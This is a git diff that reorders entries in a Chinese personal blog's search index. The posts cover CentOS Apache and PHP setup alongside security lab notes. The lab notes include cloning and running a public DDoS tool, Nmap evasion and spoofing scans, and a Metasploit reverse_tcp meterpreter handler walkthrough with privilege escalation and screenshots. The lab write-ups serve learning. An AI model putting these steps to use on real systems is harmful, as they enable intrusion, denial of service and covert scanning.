@@ -85,18 +85,6 @@
       </tags>
   </entry>
   <entry>
-    <title>DDos攻击</title>
-    <url>/2021/11/24/DDos%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<h2 id="DDos攻击"><a href="#DDos攻击" class="headerlink" title="DDos攻击"></a>DDos攻击</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Ha3MrX/DDOs-Attack   # 下载工具</span><br><span class="line">vim ddos-attack.py</span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python2</span></span><br><span class="line">chmod +777 ddos-attack.py #直接使用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>ddos</tag>
-        <tag>python</tag>
-        <tag>kali</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Android安全之短信欺诈漏洞</title>
     <url>/2021/12/27/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<p>目的：</p>
@@ -138,6 +126,18 @@
       </tags>
   </entry>
   <entry>
+    <title>DDos攻击</title>
+    <url>/2021/11/24/DDos%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h2 id="DDos攻击"><a href="#DDos攻击" class="headerlink" title="DDos攻击"></a>DDos攻击</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Ha3MrX/DDOs-Attack   # 下载工具</span><br><span class="line">vim ddos-attack.py</span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python2</span></span><br><span class="line">chmod +777 ddos-attack.py #直接使用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>ddos</tag>
+        <tag>python</tag>
+        <tag>kali</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Fckeditor漏洞上传webshell</title>
     <url>/2021/12/27/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/</url>
     <content><![CDATA[<p>目的：Fckeditor为在线网页编辑器。本实验演示<code>Fckeditor2.4.2</code>以下版本的一个编辑器上传漏洞。</p>
@@ -174,28 +174,6 @@
 ]]></content>
       <tags>
         <tag>-fckeditor -webshell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Nmap简单使用</title>
-    <url>/2021/11/24/Nmap%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h2 id="Nmap简单使用"><a href="#Nmap简单使用" class="headerlink" title="Nmap简单使用"></a>Nmap简单使用</h2><h3 id="躲避防火墙，分组发送报文"><a href="#躲避防火墙，分组发送报文" class="headerlink" title="躲避防火墙，分组发送报文"></a>躲避防火墙，分组发送报文</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -f -v 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="设定最大传输单元，必须是8的倍数"><a href="#设定最大传输单元，必须是8的倍数" class="headerlink" title="设定最大传输单元，必须是8的倍数"></a>设定最大传输单元，必须是8的倍数</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --mtu 16 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="指定多个诱饵"><a href="#指定多个诱饵" class="headerlink" title="指定多个诱饵"></a>指定多个诱饵</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -D 192.168.61.130 ME 127.0.0.1  #(ME 后面接目标地址)</span><br></pre></td></tr></table></figure>
-
-<h3 id="源地址欺骗"><a href="#源地址欺骗" class="headerlink" title="源地址欺骗"></a>源地址欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">namp -sI www.baidu.com:80 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="源端口欺骗"><a href="#源端口欺骗" class="headerlink" title="源端口欺骗"></a>源端口欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --source-port 88 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="根据发包长度（tcp是40字节，icmp溢出是28字节）"><a href="#根据发包长度（tcp是40字节，icmp溢出是28字节）" class="headerlink" title="根据发包长度（tcp是40字节，icmp溢出是28字节）"></a>根据发包长度（tcp是40字节，icmp溢出是28字节）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --data-length 30 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="MAC地址欺骗"><a href="#MAC地址欺骗" class="headerlink" title="MAC地址欺骗"></a>MAC地址欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sT -PN --spoof-mac 0 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>nmap</tag>
       </tags>
   </entry>
   <entry>
@@ -375,6 +353,28 @@
       </tags>
   </entry>
   <entry>
+    <title>Nmap简单使用</title>
+    <url>/2021/11/24/Nmap%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="Nmap简单使用"><a href="#Nmap简单使用" class="headerlink" title="Nmap简单使用"></a>Nmap简单使用</h2><h3 id="躲避防火墙，分组发送报文"><a href="#躲避防火墙，分组发送报文" class="headerlink" title="躲避防火墙，分组发送报文"></a>躲避防火墙，分组发送报文</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -f -v 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="设定最大传输单元，必须是8的倍数"><a href="#设定最大传输单元，必须是8的倍数" class="headerlink" title="设定最大传输单元，必须是8的倍数"></a>设定最大传输单元，必须是8的倍数</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --mtu 16 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="指定多个诱饵"><a href="#指定多个诱饵" class="headerlink" title="指定多个诱饵"></a>指定多个诱饵</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -D 192.168.61.130 ME 127.0.0.1  #(ME 后面接目标地址)</span><br></pre></td></tr></table></figure>
+
+<h3 id="源地址欺骗"><a href="#源地址欺骗" class="headerlink" title="源地址欺骗"></a>源地址欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">namp -sI www.baidu.com:80 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="源端口欺骗"><a href="#源端口欺骗" class="headerlink" title="源端口欺骗"></a>源端口欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --source-port 88 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="根据发包长度（tcp是40字节，icmp溢出是28字节）"><a href="#根据发包长度（tcp是40字节，icmp溢出是28字节）" class="headerlink" title="根据发包长度（tcp是40字节，icmp溢出是28字节）"></a>根据发包长度（tcp是40字节，icmp溢出是28字节）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --data-length 30 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="MAC地址欺骗"><a href="#MAC地址欺骗" class="headerlink" title="MAC地址欺骗"></a>MAC地址欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sT -PN --spoof-mac 0 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>nmap</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>arch开机启动脚本</title>
     <url>/2022/02/10/arch%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC/</url>
     <content><![CDATA[<h2 id="Arch-Linux-添加开机启动脚本"><a href="#Arch-Linux-添加开机启动脚本" class="headerlink" title="Arch Linux 添加开机启动脚本"></a>Arch Linux 添加开机启动脚本</h2><h3 id="0x01-创建一个启动service脚本"><a href="#0x01-创建一个启动service脚本" class="headerlink" title="0x01 创建一个启动service脚本"></a>0x01 创建一个启动service脚本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nano /usr/lib/systemd/system/rc-local.service</span><br></pre></td></tr></table></figure>
@@ -395,31 +395,6 @@
       <tags>
         <tag>arch</tag>
         <tag>开机启动</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>centos7安装apache</title>
-    <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85apache/</url>
-    <content><![CDATA[<h2 id="centos7-安装Apache"><a href="#centos7-安装Apache" class="headerlink" title="centos7 安装Apache"></a>centos7 安装Apache</h2><h3 id="实验准备：vmware上安装的centos7"><a href="#实验准备：vmware上安装的centos7" class="headerlink" title="实验准备：vmware上安装的centos7"></a>实验准备：vmware上安装的centos7</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux cn7 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> cat /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br></pre></td></tr></table></figure>
-
-<h3 id="安装Apache："><a href="#安装Apache：" class="headerlink" title="安装Apache："></a>安装Apache：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install httpd</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="查看http状态："><a href="#查看http状态：" class="headerlink" title="查看http状态："></a>查看http状态：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl status httpd</span></span><br><span class="line">● httpd.service - The Apache HTTP Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/httpd.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: inactive (dead)</span><br><span class="line">     Docs: man:httpd(8)</span><br><span class="line">           man:apachectl(8)</span><br></pre></td></tr></table></figure>
-
-<h3 id="启动Apache并设置为开机启动："><a href="#启动Apache并设置为开机启动：" class="headerlink" title="启动Apache并设置为开机启动："></a>启动Apache并设置为开机启动：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl start httpd</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl <span class="built_in">enable</span> httpd</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/httpd.service to /usr/lib/systemd/system/httpd.service.</span><br></pre></td></tr></table></figure>
-
-<h3 id="再次查看Apache状态："><a href="#再次查看Apache状态：" class="headerlink" title="再次查看Apache状态："></a>再次查看Apache状态：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl status httpd</span></span><br><span class="line">● httpd.service - The Apache HTTP Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/httpd.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since 六 2021-08-28 21:28:05 CST; 1min 17s ago</span><br><span class="line">     Docs: man:httpd(8)</span><br><span class="line">           man:apachectl(8)</span><br><span class="line"> Main PID: 1358 (httpd)</span><br><span class="line">   Status: &quot;Total requests: 0; Current requests/sec: 0; Current traffic:   0 B/sec&quot;</span><br><span class="line">   CGroup: /system.slice/httpd.service</span><br><span class="line">           ├─1358 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1359 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1360 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1361 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1362 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           └─1363 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line"></span><br><span class="line">8月 28 21:27:34 cn7 systemd[1]: Starting The Apache HTTP Server...</span><br><span class="line">8月 28 21:27:54 cn7 httpd[1358]: AH00558: httpd: Could not reliably determine the server&#x27;s fully qualified dom...essage</span><br><span class="line">8月 28 21:28:05 cn7 systemd[1]: Started The Apache HTTP Server.</span><br><span class="line">Hint: Some lines were ellipsized, use -l to show in full.</span><br></pre></td></tr></table></figure>
-
-<h3 id="查看Apache版本"><a href="#查看Apache版本" class="headerlink" title="查看Apache版本"></a>查看Apache版本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> httpd -v</span></span><br><span class="line">Server version: Apache/2.4.6 (CentOS)</span><br><span class="line">Server built:   Nov 16 2020 16:18:20</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用ss查看端口监听状态"><a href="#使用ss查看端口监听状态" class="headerlink" title="使用ss查看端口监听状态"></a>使用ss查看端口监听状态</h3><p>（ss -tnl     [t：tcp,n：数字显示,l：监听]）</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> ss -tnl</span></span><br><span class="line">State      Recv-Q Send-Q               Local Address:Port                              Peer Address:Port</span><br><span class="line">LISTEN     0      128                              *:22                                           *:*</span><br><span class="line">LISTEN     0      100                      127.0.0.1:25                                           *:*</span><br><span class="line">LISTEN     0      128                           [::]:22                                        [::]:*</span><br><span class="line">LISTEN     0      100                          [::1]:25                                        [::]:*</span><br><span class="line">LISTEN     0      128                           [::]:80                                        [::]:*</span><br></pre></td></tr></table></figure>
-
-<h3 id="访问虚拟机的ip地址"><a href="#访问虚拟机的ip地址" class="headerlink" title="访问虚拟机的ip地址"></a>访问虚拟机的ip地址</h3><p>如果能访问即成功。</p>
-]]></content>
-      <tags>
-        <tag>apache</tag>
-        <tag>centos7</tag>
       </tags>
   </entry>
   <entry>
@@ -476,6 +451,31 @@
       </tags>
   </entry>
   <entry>
+    <title>centos7安装apache</title>
+    <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85apache/</url>
+    <content><![CDATA[<h2 id="centos7-安装Apache"><a href="#centos7-安装Apache" class="headerlink" title="centos7 安装Apache"></a>centos7 安装Apache</h2><h3 id="实验准备：vmware上安装的centos7"><a href="#实验准备：vmware上安装的centos7" class="headerlink" title="实验准备：vmware上安装的centos7"></a>实验准备：vmware上安装的centos7</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux cn7 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> cat /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br></pre></td></tr></table></figure>
+
+<h3 id="安装Apache："><a href="#安装Apache：" class="headerlink" title="安装Apache："></a>安装Apache：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install httpd</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="查看http状态："><a href="#查看http状态：" class="headerlink" title="查看http状态："></a>查看http状态：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl status httpd</span></span><br><span class="line">● httpd.service - The Apache HTTP Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/httpd.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: inactive (dead)</span><br><span class="line">     Docs: man:httpd(8)</span><br><span class="line">           man:apachectl(8)</span><br></pre></td></tr></table></figure>
+
+<h3 id="启动Apache并设置为开机启动："><a href="#启动Apache并设置为开机启动：" class="headerlink" title="启动Apache并设置为开机启动："></a>启动Apache并设置为开机启动：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl start httpd</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl <span class="built_in">enable</span> httpd</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/httpd.service to /usr/lib/systemd/system/httpd.service.</span><br></pre></td></tr></table></figure>
+
+<h3 id="再次查看Apache状态："><a href="#再次查看Apache状态：" class="headerlink" title="再次查看Apache状态："></a>再次查看Apache状态：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl status httpd</span></span><br><span class="line">● httpd.service - The Apache HTTP Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/httpd.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since 六 2021-08-28 21:28:05 CST; 1min 17s ago</span><br><span class="line">     Docs: man:httpd(8)</span><br><span class="line">           man:apachectl(8)</span><br><span class="line"> Main PID: 1358 (httpd)</span><br><span class="line">   Status: &quot;Total requests: 0; Current requests/sec: 0; Current traffic:   0 B/sec&quot;</span><br><span class="line">   CGroup: /system.slice/httpd.service</span><br><span class="line">           ├─1358 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1359 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1360 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1361 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1362 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           └─1363 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line"></span><br><span class="line">8月 28 21:27:34 cn7 systemd[1]: Starting The Apache HTTP Server...</span><br><span class="line">8月 28 21:27:54 cn7 httpd[1358]: AH00558: httpd: Could not reliably determine the server&#x27;s fully qualified dom...essage</span><br><span class="line">8月 28 21:28:05 cn7 systemd[1]: Started The Apache HTTP Server.</span><br><span class="line">Hint: Some lines were ellipsized, use -l to show in full.</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看Apache版本"><a href="#查看Apache版本" class="headerlink" title="查看Apache版本"></a>查看Apache版本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> httpd -v</span></span><br><span class="line">Server version: Apache/2.4.6 (CentOS)</span><br><span class="line">Server built:   Nov 16 2020 16:18:20</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用ss查看端口监听状态"><a href="#使用ss查看端口监听状态" class="headerlink" title="使用ss查看端口监听状态"></a>使用ss查看端口监听状态</h3><p>（ss -tnl     [t：tcp,n：数字显示,l：监听]）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> ss -tnl</span></span><br><span class="line">State      Recv-Q Send-Q               Local Address:Port                              Peer Address:Port</span><br><span class="line">LISTEN     0      128                              *:22                                           *:*</span><br><span class="line">LISTEN     0      100                      127.0.0.1:25                                           *:*</span><br><span class="line">LISTEN     0      128                           [::]:22                                        [::]:*</span><br><span class="line">LISTEN     0      100                          [::1]:25                                        [::]:*</span><br><span class="line">LISTEN     0      128                           [::]:80                                        [::]:*</span><br></pre></td></tr></table></figure>
+
+<h3 id="访问虚拟机的ip地址"><a href="#访问虚拟机的ip地址" class="headerlink" title="访问虚拟机的ip地址"></a>访问虚拟机的ip地址</h3><p>如果能访问即成功。</p>
+]]></content>
+      <tags>
+        <tag>apache</tag>
+        <tag>centos7</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>centos7安装mariadb</title>
     <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85mariadb/</url>
     <content><![CDATA[<h2 id="centos7安装mariadb"><a href="#centos7安装mariadb" class="headerlink" title="centos7安装mariadb"></a>centos7安装mariadb</h2><p>mariadb是MYSQL的一个分支，语法基本和mysql一样，而且兼容mysql，centos7中自带了mariadb的软件包。</p>
@@ -493,6 +493,29 @@
       <tags>
         <tag>centos7</tag>
         <tag>mariadb</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>centos7安装php</title>
+    <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85php/</url>
+    <content><![CDATA[<h2 id="centos7安装php"><a href="#centos7安装php" class="headerlink" title="centos7安装php"></a>centos7安装php</h2><p>环境是apache2+mariadb+php</p>
+<p>先安装php</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install php</span></span><br></pre></td></tr></table></figure>
+
+<p>安装php相关组件</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install php-mysql php-gd php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-bcmath php-mhash</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl restart mariadb</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl restart httpd</span></span><br></pre></td></tr></table></figure>
+
+<p>通过php -v 查看信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/var/www/html#</span><span class="bash"> php -v</span></span><br><span class="line">PHP 5.4.16 (cli) (built: Apr  1 2020 04:07:17)</span><br><span class="line">Copyright (c) 1997-2013 The PHP Group</span><br><span class="line">Zend Engine v2.4.0, Copyright (c) 1998-2013 Zend Technologies</span><br></pre></td></tr></table></figure>
+
+<p>进入/var/www/html目录编写一个测试页面</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/var/www/html#</span><span class="bash"> vim index.php</span></span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最后访问页面，有php相关信息成功</p>
+]]></content>
+      <tags>
+        <tag>centos7</tag>
+        <tag>php</tag>
       </tags>
   </entry>
   <entry>
@@ -561,29 +584,6 @@
       </tags>
   </entry>
   <entry>
-    <title>centos7安装php</title>
-    <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85php/</url>
-    <content><![CDATA[<h2 id="centos7安装php"><a href="#centos7安装php" class="headerlink" title="centos7安装php"></a>centos7安装php</h2><p>环境是apache2+mariadb+php</p>
-<p>先安装php</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install php</span></span><br></pre></td></tr></table></figure>
-
-<p>安装php相关组件</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install php-mysql php-gd php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-bcmath php-mhash</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl restart mariadb</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl restart httpd</span></span><br></pre></td></tr></table></figure>
-
-<p>通过php -v 查看信息</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/var/www/html#</span><span class="bash"> php -v</span></span><br><span class="line">PHP 5.4.16 (cli) (built: Apr  1 2020 04:07:17)</span><br><span class="line">Copyright (c) 1997-2013 The PHP Group</span><br><span class="line">Zend Engine v2.4.0, Copyright (c) 1998-2013 Zend Technologies</span><br></pre></td></tr></table></figure>
-
-<p>进入/var/www/html目录编写一个测试页面</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/var/www/html#</span><span class="bash"> vim index.php</span></span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>最后访问页面，有php相关信息成功</p>
-]]></content>
-      <tags>
-        <tag>centos7</tag>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>first-blog</title>
     <url>/2021/11/24/first-blog/</url>
     <content><![CDATA[<h2 id="Test-for-my-first-blog"><a href="#Test-for-my-first-blog" class="headerlink" title="Test for my first blog"></a>Test for my first blog</h2><p>这是正文。</p>
@@ -622,35 +622,6 @@
 ]]></content>
       <tags>
         <tag>java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>metasploit之meterpreter命令</title>
-    <url>/2021/12/21/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h2 id="metasploit之meterpreter命令"><a href="#metasploit之meterpreter命令" class="headerlink" title="metasploit之meterpreter命令"></a>metasploit之meterpreter命令</h2><h3 id="目的-了解meterpreter命令"><a href="#目的-了解meterpreter命令" class="headerlink" title="目的: 了解meterpreter命令"></a>目的: 了解meterpreter命令</h3><h3 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h3><p><code>ps</code>         查询当前目标机所有进程<br><code>getpid</code>       获取当前会话进程<br><code>getuid</code>       当前用户所用的权限，所在用户组<br><code>sysinfo</code>      取系统信息<br><code>getsystem</code>    提升至system最高权限<br><code>shell</code>      进入cmdshell命令模式<br><code>pwd</code>       查看当前所在位置<br><code>cat</code>        查看文本文件<br><code>ipconfig</code>     查看网络配置信息<br><code>migrate pid</code>   迁移pid<br><code>screenshot</code>    截取当前用户屏幕保存到本地</p>
-<h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，运行msf，<code>use exploit/multi/handler</code>选择exploit，<code>set payload windows/meterpreter/reverse_tcp</code>设置payload，<code>set LHOST 192.168.1.2</code>设置监听主机，<code>set LPORT 11101</code>设置端口</p>
-<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/1.PNG"></p>
-<p>输入<code>exploit -j</code>运行脚本，且在后台监听</p>
-<p>靶机双击桌面运行xx.exe，返回kali，已经取得会话</p>
-<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/2.PNG"></p>
-<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/3.PNG"></p>
-<p>敲击回车，返回msf，执行<code>sessions</code>，查看会话，再执行<code>sessions 1</code>,进入会话</p>
-<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/4.PNG"></p>
-<p>执行<code>ps</code>查看进程</p>
-<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/5.PNG"></p>
-<p><code>getuid</code> 查看权限</p>
-<p><code>pwd</code> 查看当前路径</p>
-<p><code>screentshot</code>截图</p>
-<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/6.PNG"></p>
-<p><code>background</code>会话转入后台</p>
-<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/7.PNG"></p>
-<p>新建终端，进入/root目录下，查看截图</p>
-<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/8.PNG"></p>
-<p>实验结束</p>
-]]></content>
-      <tags>
-        <tag>msf</tag>
-        <tag>meterpreter</tag>
       </tags>
   </entry>
   <entry>
@@ -704,6 +675,35 @@
       <tags>
         <tag>msf</tag>
         <tag>PostgreSQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>metasploit之meterpreter命令</title>
+    <url>/2021/12/21/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h2 id="metasploit之meterpreter命令"><a href="#metasploit之meterpreter命令" class="headerlink" title="metasploit之meterpreter命令"></a>metasploit之meterpreter命令</h2><h3 id="目的-了解meterpreter命令"><a href="#目的-了解meterpreter命令" class="headerlink" title="目的: 了解meterpreter命令"></a>目的: 了解meterpreter命令</h3><h3 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h3><p><code>ps</code>         查询当前目标机所有进程<br><code>getpid</code>       获取当前会话进程<br><code>getuid</code>       当前用户所用的权限，所在用户组<br><code>sysinfo</code>      取系统信息<br><code>getsystem</code>    提升至system最高权限<br><code>shell</code>      进入cmdshell命令模式<br><code>pwd</code>       查看当前所在位置<br><code>cat</code>        查看文本文件<br><code>ipconfig</code>     查看网络配置信息<br><code>migrate pid</code>   迁移pid<br><code>screenshot</code>    截取当前用户屏幕保存到本地</p>
+<h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，运行msf，<code>use exploit/multi/handler</code>选择exploit，<code>set payload windows/meterpreter/reverse_tcp</code>设置payload，<code>set LHOST 192.168.1.2</code>设置监听主机，<code>set LPORT 11101</code>设置端口</p>
+<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/1.PNG"></p>
+<p>输入<code>exploit -j</code>运行脚本，且在后台监听</p>
+<p>靶机双击桌面运行xx.exe，返回kali，已经取得会话</p>
+<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/2.PNG"></p>
+<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/3.PNG"></p>
+<p>敲击回车，返回msf，执行<code>sessions</code>，查看会话，再执行<code>sessions 1</code>,进入会话</p>
+<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/4.PNG"></p>
+<p>执行<code>ps</code>查看进程</p>
+<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/5.PNG"></p>
+<p><code>getuid</code> 查看权限</p>
